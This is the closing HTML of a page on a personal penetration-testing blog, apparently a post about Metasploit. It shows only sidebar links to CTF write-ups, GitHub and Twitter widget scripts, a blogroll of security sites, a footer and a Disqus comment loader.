        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/">SkyDog Con CTF 2016 - Catch Me If You Can</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/';
        var disqus_url = 'http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
